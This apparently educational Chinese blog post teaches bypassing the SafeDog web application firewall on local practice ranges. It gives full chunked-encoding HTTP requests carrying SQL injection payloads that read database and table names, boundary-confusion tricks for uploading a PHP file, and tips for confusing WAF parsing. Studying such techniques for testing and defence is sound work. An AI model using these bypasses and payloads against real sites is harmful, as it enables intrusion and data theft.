#  Bypass WAF实战技巧！丐帮打狗棒法全集

[ EchoSec ](javascript:void\(0\);)

**EchoSec** ![]()

微信号 gh_ae9ab8305da0

功能介绍 萌新专注于网络安全行业学习

____

___发表于_

收录于合集

**目录**  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     0x01 前言  环境的搭建：0x02 HTTP补充：  分块传输的介绍：  请求头Transfer-encoding：  HTTP持久化连接：  Content-Type介绍：waf绕过的思路：  例如：绕过安全狗的sql注入：  以sql-labs为例：  读取数据库名  读取表名：  读列名：  读取数据：绕过安全狗的文件上传（以pikachu靶场为例  Content-Type中的boundary边界混淆绕过  深入研究boundary边界问题：  boundary边界问题fuzz：  boundary边界一致：  boundary结束标志不一致：  boundary开始标志不一致：  多个boundary：  多个boundary混淆：  发现：对于分块传输的小Tip：总结：

0x01 前言
某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。某狗可谓是比较好绕...

# 0x01 前言

某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。

    
    
    某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。  
    

## 环境的搭建：

环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)

    
    
    Tip：  
      （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）  
      （2）上传防护中把完整的post包过滤勾选上。  
    

# 0x02 HTTP补充：

## 分块传输的介绍：

分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-
Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135554.png)

### 请求头Transfer-encoding：

官方文档:

    
    
    告知接收方为了可靠地传输报文，已经对其进行了何种编码。  
    

chunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。并且长度中是以;作为长度的结束

    
    
    数据包中添加：Transfer-Encoding: chunked  
    数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车  
    

当设置这个Transfer-Encoding请求头的时候，会有两个效果：

    
    
    Content-length字段自动忽略  
    基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230304135615.png)

### HTTP持久化连接：

因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。

    
    
    持久化连接：  
      Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。  
      
      在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。  
    

### Content-Type介绍：

Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-
Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。  
常见Content-Type的格式如下：

    
    
    Content-Type: text/html;  
    Content-Type: application/json;charset:utf-8;  
    Content-Type：type/subtype ;parameter  
    Content-Type：application/x-www-form-urlencoded  
    Content-Type：multipart/form-data  
    

重点介绍multipart/form-data：  
当服务器使用multipart/form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？  
其中就是用了boundary边界来进行操作的。  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135616.png)

# waf绕过的思路：

正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135618.png)![](https://gitee.com/fuli009/images/raw/master/public/20230304135619.png)

#### 例如：

正常传输过程中是这样的。  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135620.png)那么分块传输之后，就变成了这样。

    
    
    POST /sqli-labs-master/Less-11/ HTTP/1.1  
    Host: 192.168.172.161  
    Content-Length: 128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    Origin: http://192.168.172.161  
    Content-Type: application/x-www-form-urlencoded  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Referer: http://192.168.172.161/sqli-labs-master/Less-11/  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Transfer-Encoding: chunked  
      
    4  
    unam  
    1  
    e  
    1  
    =  
    4  
    admi  
    1  
    n  
    1  
    &  
    4  
    pass  
    2  
    wd  
    1  
    =  
    4  
    admi  
    1  
    n  
    1  
    &  
    4  
    subm  
    2  
    it  
    1  
    =  
    4  
    Subm  
    2  
    it  
    0  
      
    

![](https://gitee.com/fuli009/images/raw/master/public/20230304135621.png)

说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。

# 绕过安全狗的sql注入：

这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。

### 以sql-labs为例：

在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把'union select
(database()),2#。这个东西进行了过滤  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135623.png)  
咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。

    
    
    Transfer-Encoding: chunked  
    这个东西，然后进行分块即可。  
    

#### 读取数据库名

    
    
    POST /sqli-labs-master/Less-11/ HTTP/1.1  
    Host: 192.168.172.161  
    Content-Length: 251  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    Origin: http://192.168.172.161  
    Content-Type: application/x-www-form-urlencoded  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Referer: http://192.168.172.161/sqli-labs-master/Less-11/  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Transfer-Encoding: chunked  
      
    1  
    u  
    4  
    name  
    1  
    =  
    1  
    &  
    2  
    pa  
    4  
    sswd  
    1  
    =  
    3  
    %27  
    2  
    un  
    1  
    i  
    2  
    on  
    1  
    +  
    2  
    se  
    1  
    l  
    2  
    ec  
    1  
    t  
    1  
    +  
    3  
    %28  
    2  
    da  
    1  
    t  
    2  
    ab  
    1  
    a  
    2  
    se  
    3  
    %28  
    3  
    %29  
    3  
    %29  
    3  
    %2C  
    1  
    2  
    3  
    %23  
    1  
    &  
    3  
    sub  
    3  
    mit  
    1  
    =  
    3  
    Sub  
    3  
    mit  
    0  
      
    

![](https://gitee.com/fuli009/images/raw/master/public/20230304135624.png)

#### 读取表名：

    
    
    POST /sqli-labs-master/Less-11/ HTTP/1.1  
    Host: 192.168.172.161  
    Content-Length: 619  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    Origin: http://192.168.172.161  
    Content-Type: application/x-www-form-urlencoded  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Referer: http://192.168.172.161/sqli-labs-master/Less-11/  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Transfer-Encoding: chunked  
      
    1  
    u  
    2  
    na  
    1  
    m  
    1  
    e  
    1  
    =  
    1  
    &  
    2  
    pa  
    2  
    ss  
    2  
    wd  
    1  
    =  
    3  
    %27  
    1  
    u  
    2  
    ni  
    1  
    o  
    1  
    n  
    1  
    +  
    2  
    se  
    2  
    le  
    1  
    c  
    1  
    t  
    1  
    +  
    3  
    %28  
    2  
    se  
    1  
    l  
    1  
    e  
    2  
    ct  
    1  
    +  
    2  
    gr  
    2  
    ou  
    1  
    p  
    1  
    _  
    2  
    co  
    2  
    nc  
    2  
    at  
    3  
    %28  
    2  
    ta  
    2  
    bl  
    1  
    e  
    1  
    _  
    2  
    na  
    2  
    me  
    3  
    %29  
    1  
    +  
    2  
    fr  
    2  
    om  
    1  
    +  
    2  
    in  
    2  
    fo  
    1  
    r  
    3  
    mat  
    2  
    io  
    1  
    n  
    1  
    _  
    2  
    sc  
    3  
    hem  
    1  
    a  
    1  
    .  
    2  
    ta  
    2  
    bl  
    2  
    es  
    1  
    +  
    2  
    wh  
    2  
    er  
    1  
    e  
    1  
    +  
    2  
    ta  
    2  
    bl  
    1  
    e  
    1  
    _  
    2  
    sc  
    2  
    he  
    1  
    m  
    1  
    a  
    3  
    %3D  
    2  
    da  
    1  
    t  
    2  
    ab  
    3  
    ase  
    3  
    %28  
    3  
    %29  
    3  
    %29  
    3  
    %2C  
    1  
    2  
    3  
    %23  
    1  
    &  
    2  
    su  
    3  
    bmi  
    1  
    t  
    1  
    =  
    2  
    Su  
    4  
    bmit  
    0  
      
    

![](https://gitee.com/fuli009/images/raw/master/public/20230304135625.png)

#### 读列名：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135626.png)

#### 读取数据：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135627.png)

# 绕过安全狗的文件上传（以pikachu靶场为例

这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135627.png)  
红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135629.png)  
这块先去上传php文件为例，可以进行分块传输的构造。然后上传。  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135630.png)  
发现单单的分块传输已经不能绕过安全狗文件上传的检测了。  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135631.png)

## Content-Type中的boundary边界混淆绕过

因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart/form-
data来进行的文件上传操作，刚才讲到了利用multipart/form-
data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。

### 深入研究boundary边界问题：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135616.png)这里拿上面的边界来做文章，这里看到了，当上面定义了boundary=----WFJAFAOKAJNFKLAJ的时候我想到了两个问题。

    
    
    1.如果有两个boundary是取前一个还是后一个？  
    2.boundary结束标志必须和定义的一定相同嘛？  
      
    下面继续一一测试  
      
    

#### boundary边界问题fuzz：

##### boundary边界一致：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135633.png)

##### boundary结束标志不一致：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135634.png)

##### boundary开始标志不一致：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135635.png)  
上面经过研究可以发现boundary结束标志不影响判断。

### 多个boundary：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135636.png)  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135637.png)

所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。

##### 多个boundary混淆：

![](https://gitee.com/fuli009/images/raw/master/public/20230304135638.png)这里进入uploads/1.php查看

![](https://gitee.com/fuli009/images/raw/master/public/20230304135640.png)  
成功绕过waf。

##### 发现：

这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。  
![](https://gitee.com/fuli009/images/raw/master/public/20230304135641.png)

### 对于分块传输的小Tip：

    
    
    (1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf  
    (2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf  
    (3)分块传输只是适用于post请求，这也是存在的弊端问题  
    

# 总结：

绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。

# 参考文献：

    
    
    https://zhuanlan.zhihu.com/p/465948117  
    http://t.zoukankan.com/liujizhou-p-11802189.html  
    https://copyfuture.com/blogs-details/202203261638435585

  

  *   *   * 

    
    
    用户773616194奇安信攻防社区https://forum.butian.net/share/1982

![](https://gitee.com/fuli009/images/raw/master/public/20230304135642.png)

点点赞

![](https://gitee.com/fuli009/images/raw/master/public/20230304135643.png)

点在看

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

